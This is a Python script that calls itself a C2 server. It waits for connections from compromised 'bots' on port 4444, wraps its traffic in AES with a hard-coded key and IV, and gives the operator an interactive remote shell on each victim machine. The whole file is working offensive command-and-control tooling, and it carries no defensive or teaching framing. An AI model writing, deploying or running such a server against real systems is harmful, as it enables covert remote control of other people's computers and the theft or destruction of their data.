#!/usr/bin/env python3
import socket
import threading
import json
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ================= CONFIG =================
HOST = "0.0.0.0"
PORT = 4444
AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV  = b'ThisIsA16ByteIV!'
# ==========================================

def encrypt(data):
    if isinstance(data, str):
        data = data.encode()
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size)

class BotHandler(threading.Thread):
    def __init__(self, conn, addr, bot_id):
        super().__init__()
        self.conn = conn
        self.addr = addr
        self.bot_id = bot_id
        self.daemon = True

    def send(self, data):
        try:
            self.conn.send(encrypt(data))
        except:
            pass

    def recv(self):
        buf = b""
        while True:
            try:
                chunk = self.conn.recv(4096)
                if not chunk:
                    return None
                buf += chunk
                try:
                    return decrypt(buf).decode()
                except:
                    continue
            except:
                return None

    def run(self):
        print(f"[+] Bot {self.bot_id} connected from {self.addr[0]}:{self.addr[1]}")
        # Receive initial info
        info = self.recv()
        if info:
            print(f"    Info: {info}")

        while True:
            try:
                cmd = input(f"Shell#{self.bot_id} ({self.addr[0]}): ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ["exit", "quit", "background", "bg"]:
                    print(f"[*] Leaving session {self.bot_id}")
                    break

                self.send(cmd)
                response = self.recv()
                if response is None:
                    print(f"[-] Bot {self.bot_id} disconnected")
                    break
                print(response)
            except KeyboardInterrupt:
                print("\n[*] Backgrounding session...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                break

        self.conn.close()

def main():
    bots = {}
    bot_counter = 0

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(20)
    print(f"[+] C2 Server listening on {HOST}:{PORT}")
    print("[+] Waiting for bots... (type 'help' for commands)\n")

    # Accept connections in background
    def accept_bots():
        nonlocal bot_counter
        while True:
            conn, addr = s.accept()
            bot_id = bot_counter
            bot_counter += 1
            handler = BotHandler(conn, addr, bot_id)
            bots[bot_id] = handler
            handler.start()

    threading.Thread(target=accept_bots, daemon=True).start()

    # Main control loop
    while True:
        try:
            cmd = input("* Center: ").strip().lower()
            if not cmd:
                continue

            if cmd in ["help", "?"]:
                print("""
Available commands:
  targets / list / bots     - List connected bots
  session <id>              - Interact with a bot
  exit / quit               - Shutdown server
                """)
            elif cmd in ["targets", "list", "bots"]:
                if not bots:
                    print("[-] No bots connected")
                else:
                    print("\nConnected bots:")
                    for bid, handler in list(bots.items()):
                        if handler.is_alive():
                            print(f"  Session {bid}  -->  {handler.addr[0]}:{handler.addr[1]}")
                        else:
                            del bots[bid]
                    print()
            elif cmd.startswith("session "):
                try:
                    bid = int(cmd.split()[1])
                    if bid in bots and bots[bid].is_alive():
                        print(f"[*] Entering session {bid} (type 'exit' or Ctrl+C to leave)")
                        # The BotHandler already runs its own input loop
                        # We just wait until it finishes
                        bots[bid].join()
                    else:
                        print("[-] No session under this number or bot offline")
                except:
                    print("[-] Usage: session <id>")
            elif cmd in ["exit", "quit"]:
                print("[*] Shutting down...")
                break
            else:
                print("[-] Command does not exist. Type 'help'")
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            break

    s.close()

if __name__ == "__main__":
    main()
